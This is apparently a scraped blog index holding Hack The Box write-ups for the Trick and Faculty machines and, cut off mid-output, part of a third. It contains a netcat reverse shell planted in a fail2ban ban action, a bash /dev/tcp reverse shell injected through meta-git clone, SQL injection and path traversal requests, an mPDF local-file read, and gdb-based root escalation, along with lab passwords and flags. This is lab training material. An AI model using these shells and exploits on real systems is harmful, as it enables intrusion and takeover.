michael@trick:~$ vim /tmp/x michael@trick:~$ rm /etc/fail2ban/action.d/iptables-multiport.conf rm: remove write-protected regular file '/etc/fail2ban/action.d/iptables-multiport.conf'? y michael@trick:~$ cp /tmp/x /etc/fail2ban/action.d/iptables-multiport.conf michael@trick:~$ grep -v '^#' /etc/fail2ban/action.d/iptables-multiport.conf | grep . [INCLUDES] before = iptables-common.conf [Definition] actionstart = \u0026lt;iptables\u0026gt; -N f2b-\u0026lt;name\u0026gt; \u0026lt;iptables\u0026gt; -A f2b-\u0026lt;name\u0026gt; -j \u0026lt;returntype\u0026gt; \u0026lt;iptables\u0026gt; -I \u0026lt;chain\u0026gt; -p \u0026lt;protocol\u0026gt; -m multiport --dports \u0026lt;port\u0026gt; -j f2b-\u0026lt;name\u0026gt; actionstop = \u0026lt;iptables\u0026gt; -D \u0026lt;chain\u0026gt; -p \u0026lt;protocol\u0026gt; -m multiport --dports \u0026lt;port\u0026gt; -j f2b-\u0026lt;name\u0026gt; \u0026lt;actionflush\u0026gt; \u0026lt;iptables\u0026gt; -X f2b-\u0026lt;name\u0026gt; actioncheck = \u0026lt;iptables\u0026gt; -n -L \u0026lt;chain\u0026gt; | grep -q 'f2b-\u0026lt;name\u0026gt;[ \\t]' actionban = /usr/bin/nc -e /bin/bash 10.10.17.44 4444 actionunban = \u0026lt;iptables\u0026gt; -D f2b-\u0026lt;name\u0026gt; -s \u0026lt;ip\u0026gt; -j \u0026lt;blocktype\u0026gt; [Init]  Now we restart the service using sudo:\nmichael@trick:~$ sudo /etc/init.d/fail2ban restart [ ok ] Restarting fail2ban (via systemctl): fail2ban.service.  And when the server bans our IP address, we will get a reverse shell. For that, we need to enter bad passwords in SSH:\n$ ssh michael@10.10.11.166 michael@10.10.11.166's password: Permission denied, please try again. michael@10.10.11.166's password: Permission denied, please try again. michael@10.10.11.166's password: michael@10.10.11.166: Permission denied (publickey,password).  We get a connection back:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.166. Ncat: Connection from 10.10.11.166:51548. script /dev/null -c bash Script started, file is /dev/null root@trick:/# ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [2] - continued ncat -nlvp 4444 reset xterm root@trick:/# export TERM=xterm root@trick:/# export SHELL=bash root@trick:/# stty rows 50 columns 158  Now we are root and thus, we have root.txt flag:\nroot@trick:/# cat /root/root.txt 2fe2e985794dd7cb023636997cefebeb  ","image":"/images/HTB/Trick/Trick.png","permalink":"https://7rocky.github.io/en/htb/trick/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine has a DNS service that is vulnerable to a Domain Zone Transfer attack and leaks a subdomain. Here we can bypass authentication with SQLi and exploit an LFI. Both vulnerabilities can be chained to get access to the machine. Then, we find another subdomain that is again vulnerable to LFI, and we can leak a user\u0026rsquo;s SSH private key. This user is able to restart fail2ban with sudo and modify configuration files","time":17,"title":"Trick"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.11.169   Release: 02 / 07 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.169 -p 22,80 Nmap scan report for 10.10.11.169 Host is up (0.059s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA) | 256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA) |_ 256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) | http-title: School Faculty Scheduling System |_Requested resource was login.php | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 9.92 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open.\nEnumeration If we go to http://10.10.11.169, we are redirected to http://faculty.htb, so we need to add this domain in /etc/hosts. Then we have this website:\nIf we try a common SQL injection payload, we will bypass authentication:\nThe type of SQLi exploited is Boolean-based Blind:\n$ curl 'faculty.htb/admin/ajax.php?action=login_faculty' -d \"id_no='\" \u0026lt;br /\u0026gt; \u0026lt;b\u0026gt;Notice\u0026lt;/b\u0026gt;: Trying to get property 'num_rows' of non-object in \u0026lt;b\u0026gt;/var/www/scheduling/admin/admin_class.php\u0026lt;/b\u0026gt; on line \u0026lt;b\u0026gt;43\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt; 3 $ curl 'faculty.htb/admin/ajax.php?action=login_faculty' -d \"id_no='+or+1=1--+-\" 1 $ curl 'faculty.htb/admin/ajax.php?action=login_faculty' -d \"id_no='+or+1=2--+-\" 3  Now we also have the absolute path for the PHP files used by the server (/var/www/scheduling/admin/admin_class.php).\nThe calendar above is not useful for the moment. Let\u0026rsquo;s apply some fuzzing to enumerate more routes:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://faculty.htb/FUZZ -e .php index.php [Status: 302, Size: 12193, Words: 1896, Lines: 359, Duration: 76ms] login.php [Status: 200, Size: 4860, Words: 270, Lines: 132, Duration: 38ms] header.php [Status: 200, Size: 2871, Words: 155, Lines: 48, Duration: 38ms] admin [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 44ms] test.php [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 62ms] topbar.php [Status: 200, Size: 1206, Words: 199, Lines: 37, Duration: 40ms] [Status: 302, Size: 12193, Words: 1896, Lines: 359, Duration: 39ms]  Alright, let\u0026rsquo;s go to /admin. It seems that the cookies remain for this site and we are still authenticated:\nFinding a PDF feature If we click on \u0026ldquo;Subject List\u0026rdquo; we are redirected to a page like /admin/index.php?page=subjects:\nIt seems that the page query parameter is vulnerable to Directory Path Traversal or Local File Inclusion, but it is not.\nAnother option we have here is to export the information to a PDF file:\nIf we check the metadata of this file using exiftool we will see that it is produced by mPDF 6.0:\n$ curl faculty.htb/mpdf/tmp/OKguepDUWdP3H1K0jRSbJn5MAc.pdf -so - | exiftool - ExifTool Version Number : 12.42 File Size : 0 bytes File Modification Date/Time : 2022:07:18 17:57:17+02:00 File Access Date/Time : 2022:07:18 17:57:17+02:00 File Inode Change Date/Time : 2022:07:18 17:57:17+02:00 File Permissions : prw-rw---- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.4 Linearized : No Page Count : 1 Page Layout : OneColumn Producer : mPDF 6.0 Create Date : 2022:07:18 16:56:31+01:00 Modify Date : 2022:07:18 16:56:31+01:00  This version of mPDF has some vulnerabilities that lead to Remote Code Execution, but we can\u0026rsquo;t exploit it. Another vulnerability is the fact that we can add HTML \u0026lt;annotation\u0026gt; tags to attach local files to the generated PDF file (more information at github.com).\nLet\u0026rsquo;s capture the request with Burp Suite:\nIt sends Base64 data. If we use CyberChef we will see that it is Base64 encoded and then doubly URL encoded:\nSo let\u0026rsquo;s use the \u0026lt;annotation\u0026gt; tag to get the /etc/passwd file and encode it as such:\nUsing the above payload, we get another PDF file:\nAnd here we can see the passwd attachment:\nAnd indeed, we retrieve the /etc/passwd file. These are the existing system users:\n$ grep sh$ passwd root:x:0:0:root:/root:/bin/bash gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash developer:x:1001:1002:,,,:/home/developer:/bin/bash  Foothold At this point, we might want to read PHP files. Let\u0026rsquo;s take a look at /var/www/scheduling/login.php:\n\u0026lt;!DOCTYPEhtml\u0026gt; \u0026lt;htmllang=\"en\"\u0026gt; \u0026lt;?php session_start(); include('admin/db_connect.php'); ob_start(); ob_end_flush(); ?\u0026gt; \u0026lt;head\u0026gt; \u0026lt;metacharset=\"utf-8\"\u0026gt; \u0026lt;metacontent=\"width=device-width, initial-scale=1.0\"name=\"viewport\"\u0026gt; \u0026lt;title\u0026gt;School Faculty Scheduling System\u0026lt;/title\u0026gt;  \u0026lt;?phpinclude('./header.php'); ?\u0026gt; \u0026lt;?php if(isset($_SESSION['login_id'])) header(\"location:index.php\"); ?\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;!-- ... -- \u0026gt;  It is referencing the file /var/www/scheduling/admin/db_connect.php:\n\u0026lt;?php $conn=newmysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')ordie(\"Could not connect to mysql\".mysqli_error($con));  And here we have a password (Co.met06aci.dly53ro.per), that, fortunately, is reused by user gbyolo in SSH:\n$ ssh gbyolo@10.10.11.169 gbyolo@10.10.11.169's password: -bash-5.0$ whoami gbyolo  This user is able to run /usr/local/bin/meta-git as developer using sudo:\n-bash-5.0$ sudo -l [sudo] password for gbyolo: Matching Defaults entries for gbyolo on faculty: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User gbyolo may run the following commands on faculty: (developer) /usr/local/bin/meta-git  Lateral movement to user developer This is a Node.js script:\n-bash-5.0$ file /usr/local/bin/meta-git /usr/local/bin/meta-git: symbolic link to ../lib/node_modules/meta-git/bin/meta-git -bash-5.0$ file /usr/local/lib/node_modules/meta-git/bin/meta-git /usr/local/lib/node_modules/meta-git/bin/meta-git: Node.js script, ASCII text executable -bash-5.0$ cat /usr/local/lib/node_modules/meta-git/bin/meta-git  #!/usr/bin/env node letloaded=false; if(loaded) returnprocess.kill(); constprogram =require('commander'); constdebug=require('debug')('meta-git'); program .command('add', 'Add file contents to the index') .command('branch', 'List, create, or delete branches') .command('checkout', 'Switch branches or restore working tree files') .command('clean', 'Remove untracked files from the working tree') .command('clone', 'Clone meta and child repositories into new directories') .command('commit', 'Record changes to the repository') .command('diff', 'Show changes between commits, commit and working tree, etc') .command('fetch', 'Download objects and refs from another repository') .command('merge', 'Join two or more development histories together') .command('pull', 'Fetch from and integrate with another repository or a local branch') .command('push', 'Update remote refs along with associated objects') .command('remote', 'Manage set of tracked repositories') .command('status', 'Show the working tree status') .command('tag', 'Create, list, delete or verify a tag object signed with GPG') .command('update', \"Clone any repos that exist in your .meta file butaren't cloned locally\") .parse(process.argv); loaded=true;  If we search for vulnerabilities of meta-git we will see a report by snyk.io, which points to HackerOne. As it is stated in the reports, we can perform the following actions to inject a shell command in meta-git clone, so we can get a reverse shell as developer:\n-bash-5.0$ cd /tmp -bash-5.0$ mkdir tests -bash-5.0$ cd tests -bash-5.0$ touch asdf -bash-5.0$ echo 'bash -i \u0026gt;\u0026 /dev/tcp/10.10.17.44/4444 0\u0026gt;\u00261' \u0026gt; /tmp/rev.sh -bash-5.0$ sudo -u developer /usr/local/bin/meta-git clone 'asdf||bash /tmp/rev.sh' meta git cloning into 'asdf||bash /tmp/rev.sh' at rev.sh rev.sh: fatal: destination path 'asdf' already exists and is not an empty directory.  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.169. Ncat: Connection from 10.10.11.169:34078. -bash-5.0$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null -bash-5.0$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm -bash-5.0$ export TERM=xterm -bash-5.0$ export SHELL=bash -bash-5.0$ stty rows 50 columns 158 -bash-5.0$ whoami developer  At this point, we can read the user.txt flag:\n-bash-5.0$ cat /home/developer/user.txt 0ba1d5bb897f62ecbbf99955e4ef0b81  Basic enumeration tells us what to do:\n-bash-5.0$ id uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty) -bash-5.0$ find / -group debug 2/dev/null /usr/bin/gdb  It seems that we are able to use GDB because we belong to debug. If we enumerate capabilities, it turns out that GDB has cap_sys_ptrace enabled:\n-bash-5.0$ getcap -r / 2/dev/null /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep /usr/bin/gdb = cap_sys_ptrace+ep /usr/bin/ping = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/bin/mtr-packet = cap_net_raw+ep  This is an issue because this capability allows us to attach and debug any process and run arbitrary instructions.\nPrivilege escalation In order to escalate privileges, we can list processes run by root and attach to the corresponding PID (process identifier):\n-bash-5.0$ ps -faux | grep root root 2 0.0 0.0 0 0 ? S 15:10 0:00 [kthreadd] root 3 0.0 0.0 0 0 ? I\u0026lt; 15:10 0:00 \\_ [rcu_gp] root 4 0.0 0.0 0 0 ? I\u0026lt; 15:10 0:00 \\_ [rcu_par_gp] ... root 718 0.0 0.4 238080 9444 ? Ssl 15:10 0:00 /usr/lib/accountsservice/accounts-daemon root 724 0.0 0.1 81956 3716 ? Ssl 15:10 0:00 /usr/sbin/irqbalance --foreground root 725 0.0 0.9 26896 18196 ? Ss 15:10 0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers root 728 0.0 0.4 236436 9076 ? Ssl 15:10 0:00 /usr/lib/policykit-1/polkitd --no-debug root 735 0.0 0.3 17348 7664 ? Ss 15:10 0:00 /lib/systemd/systemd-logind ... root 968 0.0 0.0 2860 1796 tty1 Ss+ 15:10 0:00 /sbin/agetty -o -p -- \\u --noclear tty1 linux root 1571 0.0 0.2 38072 4576 ? Ss 15:10 0:00 /usr/lib/postfix/sbin/master -w -bash-5.0$ gdb -q -p 725 Attaching to process 725 Reading symbols from /usr/bin/python3.8... (No debugging symbols found in /usr/bin/python3.8) Reading symbols from /lib/x86_64-linux-gnu/libc.so.6... Reading symbols from /usr/lib/debug/.build-id/18/78e6b475720c7c51969e69ab2d276fae6d1dee.debug... Reading symbols from /lib/x86_64-linux-gnu/libpthread.so.0... Reading symbols from /usr/lib/debug/.build-id/7b/4536f41cdaa5888408e82d0836e33dcf436466.debug... [Thread debugging using libthread_db enabled] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\". Reading symbols from /lib/x86_64-linux-gnu/libdl.so.2... ... Reading symbols from /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so... (No debugging symbols found in /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so) 0x00007f8d5dbf6967 in __GI___poll (fds=0x25b4a60, nfds=3, timeout=-1) at ../sysdeps/unix/sysv/linux/poll.c:29 29 ../sysdeps/unix/sysv/linux/poll.c: No such file or directory.  At this point, we can see that system (from Glibc) is loaded in memory, so we can call it using a shell command. For instance, let\u0026rsquo;s add SUID permissions to /bin/bash:\n(gdb) p system $1 = {int (const char *)} 0x7f8d5db36290 \u0026lt;__libc_system\u0026gt; (gdb) call system(\"chmod 4755 /bin/bash\") [Detaching after vfork from child process 53188] $2 = 0 (gdb) quit A debugging session is active. Inferior 1 [process 725] will be detached. Quit anyway? (y or n) y Detaching from program: /usr/bin/python3.8, process 725 [Inferior 1 (process 725) detached] -bash-5.0$ ls -l /bin/bash -rwsr-xr-x 1 root root 1183448 Apr 18 11:14 /bin/bash  And now /bin/bash is a SUID binary, so we can execute it as root:\n-bash-5.0$ bash -p -bash-5.0# cat /root/root.txt fbe411b0063d04a996b537b337d14d51  ","image":"/images/HTB/Faculty/Faculty.png","permalink":"https://7rocky.github.io/en/htb/faculty/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine has a website that is vulnerable to SQLi and autentication bypass which leads to a website where we can export HTML content to PDF. There is a vulnerability where we can attach local files to the PDF file and read a password reused for SSH. Using sudo we can execute a Node.js script as another user and exploit a command injection vulnerability. This second user is allowed to run GDB and moreover GDB has cap_sys_ptrace capability set, so we can debug a process running as root and run arbitrary code","time":8,"title":"Faculty"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.11.164   Release: 21 / 05 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.164 -p 22,80 Nmap scan report for 10.10.11.164 Host is up (0.052s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA) | 256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA) |_ 256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519) 80/tcp open http Werkzeug/2.1.2 Python/3.10.3 | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: | Content-Type: text/html; charset=utf-8 | Content-Length: 5316 | Connection: close | \u0026lt;html lang=\"en\"\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\"UTF-8\"\u0026gt; | \u0026lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u0026gt; | \u0026lt;title\u0026gt;upcloud - Upload files for Free!\u0026lt;/title\u0026gt; | \u0026lt;script src=\"/static/vendor/jquery/jquery-3.4.1.min.js\"\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;script src=\"/static/vendor/popper/popper.min.js\"\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;script src=\"/static/vendor/bootstrap/js/bootstrap.min.js\"\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;script src=\"/static/js/ie10-viewport-bug-workaround.js\"\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;link rel=\"stylesheet\" href=\"/static/vendor/bootstrap/css/bootstrap.css\"/\u0026gt; | \u0026lt;link rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-grid.css\"/\u0026gt; | \u0026lt;link rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-reboot.css\"/\u0026gt; | \u0026lt;link rel= | HTTPOptions: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: | Content-Type: text/html; charset=utf-8 | Allow: GET, OPTIONS, HEAD | Content-Length: 0 | Connection: close | RTSPRequest: | \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" | \"http://www.w3.org/TR/html4/strict.dtd\"\u0026gt; | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"\u0026gt; | \u0026lt;title\u0026gt;Error response\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;Error response\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;Error code: 400\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Message: Bad request version ('RTSP/1.0').\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.\u0026lt;/p\u0026gt; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; |_http-server-header: Werkzeug/2.1.2 Python/3.10.3 |_http-title: upcloud - Upload files for Free! 3000/tcp filtered ppp Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 96.61 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open. Port 3000 is filtered.\nEnumeration If we go to http://10.10.11.164, we will see a page like this:\nScrolling through the page, we can download the source code for part of the web application:\nThis web application is shown in /upcloud:\nFirst of all, let\u0026rsquo;s apply some fuzzing to enumerate more routes:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.164/FUZZ download [Status: 200, Size: 2489147, Words: 9473, Lines: 9803, Duration: 155ms] console [Status: 200, Size: 1563, Words: 330, Lines: 46, Duration: 45ms]  There is /console, which is really interesting if we had the PIN, but we don\u0026rsquo;t:\nThere are ways to compute the PIN if we have access to some specific files of the server (more information here).\nGit enumeration So, let\u0026rsquo;s analyze the given source code. First of all, we have these files and directories:\n$ tree -a -L 1 . ├── .git ├── Dockerfile ├── app ├── build-docker.sh ├── config └── source.zip 3 directories, 3 files  As we have a .git directory, we have downloaded a Git repository, so there might be some sensitive information in old commits:\n$ git log commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -\u0026gt; public) Author: gituser \u0026lt;gituser@local\u0026gt; Date: Thu Apr 28 13:55:55 2022 +0200 clean up dockerfile for production use commit ee9d9f1ef9156c787d53074493e39ae364cd1e05 Author: gituser \u0026lt;gituser@local\u0026gt; Date: Thu Apr 28 13:45:17 2022 +0200 initial $ git diff 2c67 ee9d diff --git a/Dockerfile b/Dockerfile index 5b0553c..76c7768 100644 --- a/Dockerfile +++ b/Dockerfile @@ -29,6 +29,7 @@ ENV PYTHONDONTWRITEBYTECODE=1 # Set mode ENV MODE=\"PRODUCTION\" +# ENV FLASK_DEBUG=1 # Run supervisord CMD [\"/usr/bin/supervisord\", \"-c\", \"/etc/supervisord.conf\"]  Nothing useful at all. Let\u0026rsquo;s see if we have more branches:\n$ git branch dev * public  There\u0026rsquo;s a branch called dev, let\u0026rsquo;s switch to that and enumerate old commits again:\n$ git checkout dev Cambiado a rama 'dev' $ git log commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -\u0026gt; dev) Author: gituser \u0026lt;gituser@local\u0026gt; Date: Thu Apr 28 13:47:24 2022 +0200 ease testing commit be4da71987bbbc8fae7c961fb2de01ebd0be1997 Author: gituser \u0026lt;gituser@local\u0026gt; Date: Thu Apr 28 13:46:54 2022 +0200 added gitignore commit a76f8f75f7a4a12b706b0cf9c983796fa1985820 Author: gituser \u0026lt;gituser@local\u0026gt; Date: Thu Apr 28 13:46:16 2022 +0200 updated commit ee9d9f1ef9156c787d53074493e39ae364cd1e05 Author: gituser \u0026lt;gituser@local\u0026gt; Date: Thu Apr 28 13:45:17 2022 +0200 initial  It looks better. Let\u0026rsquo;s see the differences:\n$ git diff a76f ee9d diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json deleted file mode 100644 index 5975e3f..0000000 --- a/app/.vscode/settings.json +++ /dev/null @@ -1,5 +0,0 @@ -{ - \"python.pythonPath\": \"/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python\", - \"http.proxy\": \"http://dev01:Soulless_Developer#2022@10.10.10.128:5187/\", - \"http.proxyStrictSSL\": false -} diff --git a/app/app/views.py b/app/app/views.py index 0f3cc37..f2744c6 100644 --- a/app/app/views.py +++ b/app/app/views.py @@ -6,17 +6,7 @@ from flask import render_template, request, send_file from app import app -@app.route('/') -def index(): - return render_template('index.html') - - -@app.route('/download') -def download(): - return send_file(os.path.join(os.getcwd(), \"app\", \"static\", \"source.zip\")) - - -@app.route('/upcloud', methods=['GET', 'POST']) +@app.route('/', methods=['GET', 'POST']) def upload_file(): if request.method == 'POST': f = request.files['file'] @@ -30,4 +20,4 @@ def upload_file(): @app.route('/uploads/\u0026lt;path:path\u0026gt;') def send_report(path): path = get_file_name(path) - return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path)) + return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path)) \\ No newline at end of file  And there we can see a clear text password for user dev01: Soulless_Developer#2022. These credentials are used for an HTTP proxy on port 5187, but this port is closed according to nmap.\nStatic code analysis Let\u0026rsquo;s continue by taking a look to the source files:\nimport os from flask import Flask app = Flask(__name__) if os.environ.get('MODE') == 'PRODUCTION': app.config.from_object('app.configuration.ProductionConfig') else: app.config.from_object('app.configuration.DevelopmentConfig') from app import views  It uses Flask, which is a Python web framework. The file called views.py contains all the available routes:\nimport os from app.utils import get_file_name from flask import render_template, request, send_file from app import app @app.route('/') def index(): return render_template('index.html') @app.route('/download') def download(): return send_file(os.path.join(os.getcwd(), \"app\", \"static\", \"source.zip\")) @app.route('/upcloud', methods=['GET', 'POST']) def upload_file(): if request.method == 'POST': f = request.files['file'] file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), \"public\", \"uploads\", file_name) f.save(file_path) return render_template('success.html', file_url=request.host_url + \"uploads/\" + file_name) return render_template('upload.html') @app.route('/uploads/\u0026lt;path:path\u0026gt;') def send_report(path): path = get_file_name(path) return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path))  There is an interesting endpoint at /uploads, which takes a path and prints out the indicated file. However, there is some sanitization on the function get_file_name, which is in utils.py:\nimport time def current_milli_time(): return round(time.time() * 1000) \"\"\" Pass filename and return a secure version, which can then safely be stored on a regular file system. \"\"\" def get_file_name(unsafe_filename): return recursive_replace(unsafe_filename, \"../\", \"\") \"\"\" TODO: get unique filename \"\"\" def get_unique_upload_name(unsafe_filename): spl = unsafe_filename.rsplit(\"\\\\.\", 1) file_name = spl[0] file_extension = spl[1] return recursive_replace(file_name, \"../\", \"\") + \"_\" + str(current_milli_time()) + \".\" + file_extension \"\"\" Recursively replace a pattern in a string \"\"\" def recursive_replace(search, replace_me, with_me): if replace_me not in search: return search return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)  As we can see, the developer uses a recursive approach to remove directory traversal attempts. For instance, \u0026quot;....//\u0026quot; will be transformed to \u0026quot;../\u0026quot; and finally it will become an empty string.\nHowever, there is something left behind, since we can use a single ../ and then put a file like /etc/passwd. The problem is that get_file_name will return \u0026quot;/etc/passwd\u0026quot;, and os.path.join will result in /etc/passwd because it won\u0026rsquo;t be able to join an absolute path with the current working directory, public and uploads:\n@app.route('/uploads/\u0026lt;path:path\u0026gt;') def send_report(path): path = get_file_name(path) return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path))  Here is a simple proof of concept, using %2e as . (URL encoding):\n$ curl 10.10.11.164/uploads/%2e%2e//etc/passwd root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin  Foothold So we have a way to read files from the server (Directory Path Traversal). At this point, we can try to get the needed information in order to calculate the Werkzeug PIN for /console and run arbitrary Python code.\nWerkzeug PIN exploit Going back to the Werkzeug PIN exploit explanation, we need:\n The user that runs the server. The absolute path for app.py in flask directory. The MAC address of the machine (in hexadecimal). The machine ID, which is stored in /etc/machine-id or in /proc/sys/kernel/random/boot_id.  The user that runs the server must be root, since there is no other user in /etc/passwd. Moreover, the machine is a Docker container, because of the random hostname:\n$ curl 10.10.11.164/uploads/%2e%2e//etc/hostname ef4008903997  The app.py file must be inside /usr/local/lib/python3.5/dist-packages/flask/app.py (according to the exploit), but it is not there. Maybe, the version of Python is newer, we find the right path when causing an error (namely, clicking \u0026ldquo;Upload\u0026rdquo; without a file), because debug mode is active:\nSo this is the correct path: /usr/local/lib/python3.10/site-packages/flask/app.py.\nFor the MAC address, we know it must be in /sys/class/net/\u0026lt;device id\u0026gt;/address. We can guess that the device is eth0, which is very common. And indeed it is, we have the MAC address:\n$ curl 10.10.11.164/uploads/%2e%2e//sys/class/net/eth0/address 02:42:ac:11:00:06 curl: (18) transfer closed with 4078 bytes remaining to read  The exploit explanation says to use /proc/net/arp to see available network interfaces, but we don\u0026rsquo;t get a response using curl. The problem is that the Content-Length header is set to 0, so curl stops reading. Using verbose mode, there is a warning:\n$ curl 10.10.11.164/uploads/%2e%2e//proc/net/arp -v * Trying 10.10.11.164:80... * Connected to 10.10.11.164 (10.10.11.164) port 80 (#0) \u0026gt; GET /uploads/%2e%2e//proc/net/arp HTTP/1.1 \u0026gt; Host: 10.10.11.164 \u0026gt; User-Agent: curl/7.84.0 \u0026gt; Accept: */* \u0026gt; * Mark bundle as not supporting multiuse \u0026lt; HTTP/1.1 200 OK \u0026lt; Server: Werkzeug/2.1.2 Python/3.10.3 \u0026lt; Date: Tue, 05 Jul 2022 01:13:04 GMT \u0026lt; Content-Disposition: inline; filename=arp \u0026lt; Content-Type: application/octet-stream \u0026lt; Content-Length: 0 \u0026lt; Last-Modified: Tue, 05 Jul 2022 01:13:04 GMT \u0026lt; Cache-Control: no-cache \u0026lt; ETag: 